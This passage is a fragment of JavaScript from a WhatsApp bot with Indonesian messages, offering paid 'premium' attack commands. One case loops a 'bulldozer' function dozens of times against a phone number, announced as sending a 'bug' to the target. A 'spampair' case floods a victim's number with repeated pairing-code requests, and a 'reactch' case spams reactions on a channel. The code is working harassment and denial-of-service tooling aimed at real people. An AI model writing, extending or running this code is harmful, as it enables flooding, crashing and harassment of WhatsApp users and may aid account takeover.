target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙱𝚄𝙶 ${prefix+command} 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝙽𝙾𝙼𝙴𝚁 𝚃𝙰𝚁𝙶𝙴𝚃🎯 *𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰,𝙹𝙴𝙳𝙰 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 𝟻 𝙼𝙴𝙽𝙸𝚃*`); 
          for (let i = 0; i < 35; i++) {
            await bulldozer(target);
            await sleep(1500);
            await bulldozer(target);
           
}
    }
  
break;
//======================
//case reactch
  case "reactch": {

if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');

if (!text) return m.reply(".spamreactch linkpesan 😂")

if (!args[0] || !args[1]) return m.reply("Wrong Format")

if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")

let result = args[0].split('/')[4]

let serverId = args[0].split('/')[5]

let res = await Usztzy.newsletterMetadata("invite", result)

await Usztzy.newsletterReactMessage(res.id, serverId, args[1])

m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)

}

break      
//case spam pair
//======================
case 'spampair': {
  if (!isPremium) return m.reply('𝙺𝙷𝚄𝚂𝚄𝚂 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙱𝙽𝙶 𝚄𝚂𝚉 𝙼𝙰𝚄? 𝙹𝙰𝙳𝙸 𝙼𝙴𝙼𝙱𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼? 𝙼𝙰𝚂𝚄𝙺 𝙺𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝚄𝚂𝚉𝚃𝚁𝙴𝙰𝙼𝙰𝙺𝙴𝚁👇                                                                 https://whatsapp.com/channel/0029Vb5ZWobDZ4LfLDRx2137');
  if (!text) return m.reply(`*𝙲𝙾𝙽𝚃𝙾𝙷:* ${prefix + command} +628xxxxxx|150`);
  m.reply('𝙿𝚁𝙾𝚂𝙴𝚂 𝙱𝙽𝙶 𝚄𝚂𝚉...');
  let [peenis, pepekk = "200"] = text.split("|");
  let target = peenis.replace(/[^0-9]/g, '').trim();
  const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
  const { state } = await useMultiFileAuthState('pepek');
  const { version } = await fetchLatestBaileysVersion();
  const pino = require("pino");
  const sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  for (let i = 0; i < pepekk; i++) {
    await sleep(1500);
    let prc = await sucked.requestPairingCode(target);
    console.log(`_𝙳𝙾𝙽𝙴 𝚂𝙿𝙰𝙼 𝙿𝙰𝙸𝚁𝙸𝙽𝙶 𝙲𝙾𝙳𝙴 - 𝙽𝙾𝙼𝙴𝚁 : ${target} - Code : ${prc}_`);
  }
  await sleep(15000);
}
break;

//======================
default:
}} catch (err) {
console.log('\x1b[1;31m'+err+'\x1b[0m')}}